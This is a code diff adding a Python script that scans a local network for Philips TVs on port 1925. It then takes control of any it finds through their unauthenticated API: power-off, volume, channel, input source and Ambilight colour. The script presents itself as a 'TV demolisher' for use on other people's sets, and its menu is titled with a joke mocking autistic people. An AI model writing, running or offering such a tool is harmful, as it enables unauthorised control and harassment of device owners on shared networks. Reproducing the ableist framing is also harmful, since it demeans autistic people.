@@ -1,0 +1,163 @@
+#!/usr/bin/env python3
+import socket
+import ipaddress
+import requests
+import json
+import sys
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+API_VERSION = "6"
+TV_IP = None
+
+def scan_ip(ip):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(0.5)
+        result = sock.connect_ex((str(ip), 1925))
+        sock.close()
+        if result == 0:
+            return str(ip)
+    except:
+        return None
+    return None
+
+def discover_tv_ip(network=input("Specify the network to be scanned(eg. 192.168.1.0/24): ")):
+    print("[YOOKOSO!] philips tv demolisher by pappa [YOOKOSO!]\n")
+    print(f"[*] Scanning {network} for Philips TV on port 1925...")
+    net = ipaddress.ip_network(network, strict=False)
+    found_ips = []
+
+    with ThreadPoolExecutor(max_workers=50) as executor:
+        futures = {executor.submit(scan_ip, ip): ip for ip in net.hosts()}
+        for future in as_completed(futures):
+            ip = futures[future]
+            result = future.result()
+            if result:
+                print(f"[+] Poor TV found : {result}:1925")
+                try:
+                    r = requests.get(f"http://{result}:1925/{API_VERSION}/system", timeout=1)
+                    if r.status_code == 200 and "name" in r.json():
+                        print(f"[✓] Philips TV detected: {r.json().get('name')}")
+                        return result
+                except:
+                    pass
+    return None
+
+def base_url(ip):
+    return f"http://{ip}:1925/{API_VERSION}"
+
+def send_key(ip, key):
+    url = f"{base_url(ip)}/input/key"
+    data = {"key": key}
+    try:
+        r = requests.post(url, json=data, timeout=2)
+        print(f"[>] Sent key: {key} | Response: {r.status_code}")
+    except Exception as e:
+        print(f"[!] Error: {e}")
+
+def get_volume(ip):
+    url = f"{base_url(ip)}/audio/volume"
+    try:
+        r = requests.get(url, timeout=2)
+        print(json.dumps(r.json(), indent=2))
+    except Exception as e:
+        print(f"[!] Error: {e}")
+
+def set_volume(ip, level):
+    url = f"{base_url(ip)}/audio/volume"
+    data = {"current": level}
+    try:
+        r = requests.post(url, json=data, timeout=2)
+        print(f"[>] Set volume {level} | Response: {r.status_code}")
+    except Exception as e:
+        print(f"[!] Error: {e}")
+
+def ambilight_power(ip, state="On"):
+    url = f"{base_url(ip)}/ambilight/power"
+    try:
+        r = requests.post(url, json={"power": state}, timeout=2)
+        print(f"[>] Ambilight {state} | Response: {r.status_code}")
+    except Exception as e:
+        print(f"[!] Error: {e}")
+
+def ambilight_color(ip, r_val, g_val, b_val):
+    url = f"{base_url(ip)}/ambilight/processed"
+    payload = {"1":{"1":{"r":r_val,"g":g_val,"b":b_val}}}
+    try:
+        r = requests.put(url, json=payload, timeout=2)
+        print(f"[>] Ambilight color set to RGB({r_val},{g_val},{b_val}) | Response: {r.status_code}")
+    except Exception as e:
+        print(f"[!] Error: {e}")
+
+def show_menu():
+    print("""
+=== Philips TV Autism Crisis ===
+1. Power Off (Standby)
+2. Volume Up
+3. Volume Down
+4. Mute
+5. Channel Up
+6. Channel Down
+7. Home
+8. Source
+9. Back
+10. Get Volume Status
+11. Set Volume (enter number)
+12. Ambilight ON
+13. Ambilight OFF
+14. Ambilight Color (R,G,B)
+0. Exit
+""")
+
+if __name__ == "__main__":
+    TV_IP = discover_tv_ip("192.168.1.0/24")
+    if not TV_IP:
+        print("[!] No Philips TV found on LAN.")
+        sys.exit(1)
+
+    print(f"[✓] Using TV at {TV_IP}")
+
+    while True:
+        show_menu()
+        choice = input("Select option: ").strip()
+
+        if choice == "1":
+            send_key(TV_IP, "Standby")
+        elif choice == "2":
+            send_key(TV_IP, "VolumeUp")
+        elif choice == "3":
+            send_key(TV_IP, "VolumeDown")
+        elif choice == "4":
+            send_key(TV_IP, "Mute")
+        elif choice == "5":
+            send_key(TV_IP, "ChannelUp")
+        elif choice == "6":
+            send_key(TV_IP, "ChannelDown")
+        elif choice == "7":
+            send_key(TV_IP, "Home")
+        elif choice == "8":
+            send_key(TV_IP, "Source")
+        elif choice == "9":
+            send_key(TV_IP, "Back")
+        elif choice == "10":
+            get_volume(TV_IP)
+        elif choice == "11":
+            level = input("Enter volume level (0-60): ")
+            set_volume(TV_IP, int(level))
+        elif choice == "12":
+            ambilight_power(TV_IP, "On")
+        elif choice == "13":
+            ambilight_power(TV_IP, "Off")
+        elif choice == "14":
+            rgb = input("Enter RGB values (e.g. 255,0,128): ")
+            try:
+                r_val, g_val, b_val = map(int, rgb.split(","))
+                ambilight_color(TV_IP, r_val, g_val, b_val)
+            except:
+                print("[!] Invalid format. Use R,G,B")
+        elif choice == "0":
+            print("sayonara!!")
+            sys.exit(0)
+        else:
+            print("Invalid choice")
+
